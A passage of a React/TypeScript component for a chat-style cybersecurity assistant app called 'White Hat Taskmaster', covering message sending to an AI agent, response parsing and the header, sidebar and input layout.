          ...c,
          title: isFirstMsg ? trimmed.slice(0, 60) : c.title,
          messages: [...c.messages, userMsg, loadingMsg],
          updatedAt: now,
        }
      }
      return c
    }))

    setInputValue('')
    if (textareaRef.current) {
      textareaRef.current.style.height = 'auto'
    }
    setIsLoading(true)
    setActiveAgentId(MANAGER_AGENT_ID)

    try {
      const result = await callAIAgent(trimmed, MANAGER_AGENT_ID, { session_id: targetConvId })

      const responseNow = new Date().toISOString()
      let parsed: OrchestratorResponse | null = null
      let fallbackContent = ''

      if (result.success) {
        const agentResult = result?.response?.result
        parsed = parseOrchestratorResponse(agentResult)

        if (!parsed) {
          // Try to extract any text for fallback display
          fallbackContent = result?.response?.message
            ?? (typeof agentResult === 'string' ? agentResult : '')
            ?? (agentResult?.text ?? '')
            ?? (agentResult?.summary ?? '')
            ?? JSON.stringify(agentResult ?? {}, null, 2)
        }
      } else {
        fallbackContent = result?.error ?? result?.response?.message ?? 'Security analysis failed. Please verify your query and try again.'
      }

      const assistantMsg: Message = {
        id: generateId(),
        role: 'assistant',
        content: parsed?.summary ?? fallbackContent,
        parsedResponse: parsed ?? undefined,
        timestamp: responseNow,
      }

      setConversations(prev => prev.map(c => {
        if (c.id === targetConvId) {
          return {
            ...c,
            messages: c.messages.filter(m => m.id !== loadingMsg.id).concat(assistantMsg),
            updatedAt: responseNow,
          }
        }
        return c
      }))
    } catch (err) {
      const errorNow = new Date().toISOString()
      const errMsg: Message = {
        id: generateId(),
        role: 'assistant',
        content: 'A system error occurred during security analysis. Please try again.',
        timestamp: errorNow,
      }
      setConversations(prev => prev.map(c => {
        if (c.id === targetConvId) {
          return {
            ...c,
            messages: c.messages.filter(m => m.id !== loadingMsg.id).concat(errMsg),
            updatedAt: errorNow,
          }
        }
        return c
      }))
    } finally {
      setIsLoading(false)
      setActiveAgentId(null)
    }
  }, [activeConversationId, isLoading])

  const handleKeyDown = useCallback((e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault()
      sendMessage(inputValue)
    }
  }, [inputValue, sendMessage])

  const handleSuggestionClick = useCallback((text: string) => {
    sendMessage(text)
  }, [sendMessage])

  // Sample data
  const sampleMessages = getSampleMessages()
  const displayMessages = sampleData && messages.length === 0 ? sampleMessages : messages
  const showWelcome = displayMessages.length === 0

  // Derive the displayed risk level (from sample data or real)
  const displayRiskLevel = (() => {
    if (sampleData && messages.length === 0) return 'Critical'
    return lastRiskLevel
  })()

  return (
    <ErrorBoundary>
      <div className="min-h-screen h-screen flex flex-col bg-background text-foreground font-sans">
        {/* Header */}
        <header className="flex items-center justify-between px-4 py-3 border-b border-border bg-card/50 backdrop-blur-sm z-20 flex-shrink-0">
          <div className="flex items-center gap-3">
            <button
              onClick={() => setSidebarOpen(!sidebarOpen)}
              className="p-2 rounded-lg hover:bg-muted/50 transition-colors duration-150"
              title="Toggle sidebar"
            >
              {sidebarOpen ? <FiX className="w-5 h-5 text-foreground" /> : <FiMenu className="w-5 h-5 text-foreground" />}
            </button>
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-xl bg-accent/20 flex items-center justify-center border border-accent/30">
                <FiShield className="w-4 h-4 text-accent" />
              </div>
              <div>
                <h1 className="text-base font-bold tracking-tight text-foreground leading-none">White Hat Taskmaster</h1>
                <p className="text-xs text-muted-foreground hidden sm:block">Ethical Cybersecurity Intelligence Platform</p>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-3">
            {/* Risk Level Indicator in Header */}
            <HeaderRiskIndicator level={displayRiskLevel} />

            {/* Sample Data Toggle */}
            <label className="flex items-center gap-2 cursor-pointer select-none">
              <span className="text-xs text-muted-foreground hidden sm:inline">Sample Data</span>
              <div className="relative">
                <input
                  type="checkbox"
                  checked={sampleData}
                  onChange={(e) => setSampleData(e.target.checked)}
                  className="sr-only"
                />
                <div className={`w-9 h-5 rounded-full transition-colors duration-200 ${sampleData ? 'bg-accent' : 'bg-muted'}`} />
                <div className={`absolute top-0.5 left-0.5 w-4 h-4 rounded-full bg-white transition-transform duration-200 ${sampleData ? 'translate-x-4' : 'translate-x-0'}`} />
              </div>
            </label>
            {/* Agent Info Toggle */}
            <button
              onClick={() => setShowAgentInfo(!showAgentInfo)}
              className={`p-2 rounded-lg transition-colors duration-150 ${showAgentInfo ? 'bg-accent/20 text-accent' : 'hover:bg-muted/50 text-muted-foreground'}`}
              title="Agent status panel"
            >
              <FiActivity className="w-4 h-4" />
            </button>
          </div>
        </header>

        <div className="flex flex-1 overflow-hidden relative">
          {/* Sidebar */}
          {sidebarOpen && (
            <aside className="w-72 flex-shrink-0 border-r border-border bg-card/30 flex flex-col z-10 absolute md:relative h-full">
              <div className="p-3 space-y-2 flex-shrink-0">
                <button
                  onClick={createNewConversation}
                  className="w-full flex items-center justify-center gap-2 px-3 py-2.5 rounded-xl bg-accent text-accent-foreground text-sm font-medium hover:bg-accent/90 transition-colors duration-150"
                >
                  <FiPlus className="w-4 h-4" />
                  New Scan
                </button>
                <div className="relative">
                  <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="Search scans..."
                    className="w-full pl-9 pr-3 py-2 rounded-lg bg-muted/30 border border-border text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:ring-1 focus:ring-accent/50 focus:border-accent/30 transition-colors"
                  />
                </div>
              </div>
              <div className="flex-1 overflow-y-auto px-2 pb-2 space-y-0.5">
                {filteredConversations.length === 0 && (
                  <div className="text-center py-8 text-muted-foreground/50 text-xs">
                    {searchQuery ? 'No matching scans' : 'No scans yet'}
                  </div>
                )}
                {filteredConversations.map(conv => (
                  <SidebarConversationItem
                    key={conv.id}
                    conv={conv}
                    isActive={conv.id === activeConversationId}
                    onClick={() => setActiveConversationId(conv.id)}
                    onDelete={(e) => deleteConversation(e, conv.id)}
                  />
                ))}
              </div>
            </aside>
          )}

          {/* Main Content */}
          <main className="flex-1 flex flex-col min-w-0 relative">
            {/* Agent Info Panel */}
            <AgentStatusPanel activeAgentId={activeAgentId} showPanel={showAgentInfo} />

            {/* Chat Area */}
            <div ref={chatContainerRef} className="flex-1 overflow-y-auto">
              {showWelcome ? (
                <WelcomeScreen onPromptClick={handleSuggestionClick} />
              ) : (
                <div className="py-4">
                  {displayMessages.map((msg) => (
                    msg.role === 'user' ? (
                      <UserMessage key={msg.id} message={msg} />
                    ) : (
                      <AssistantMessage key={msg.id} message={msg} onSuggestionClick={handleSuggestionClick} />
                    )
                  ))}
                  <div ref={messagesEndRef} />
                </div>
              )}
            </div>

            {/* Input Bar */}
            <div className="border-t border-border bg-card/50 backdrop-blur-sm p-4 flex-shrink-0">
              <div className="max-w-4xl mx-auto">
                <div className="flex items-end gap-3 bg-muted/30 border border-border rounded-xl p-2 focus-within:ring-1 focus-within:ring-accent/50 focus-within:border-accent/30 transition-all duration-200">
                  <textarea
                    ref={textareaRef}
                    value={inputValue}
                    onChange={handleTextareaChange}
                    onKeyDown={handleKeyDown}
                    placeholder="Describe a security scenario, paste code for review, ask about threats..."
                    rows={1}
                    disabled={isLoading}
                    className="flex-1 bg-transparent text-sm text-foreground placeholder:text-muted-foreground/50 resize-none focus:outline-none py-2 px-2 max-h-[200px] leading-relaxed disabled:opacity-50"
                  />
                  <button
                    onClick={() => sendMessage(inputValue)}
                    disabled={isLoading || !inputValue.trim()}
                    className="flex-shrink-0 w-9 h-9 rounded-lg bg-accent text-accent-foreground flex items-center justify-center hover:bg-accent/90 disabled:opacity-30 disabled:cursor-not-allowed transition-all duration-150"
                    title="Send message"
                  >
                    {isLoading ? (
                      <div className="w-4 h-4 border-2 border-accent-foreground/30 border-t-accent-foreground rounded-full animate-spin" />
                    ) : (
                      <FiSend className="w-4 h-4" />
                    )}
                  </button>
                </div>
                <p className="text-xs text-muted-foreground/40 text-center mt-2">
                  Press Enter to send. Shift+Enter for a new line.
                </p>
              </div>
            </div>
          </main>
        </div>
      </div>
    </ErrorBoundary>
  )
}
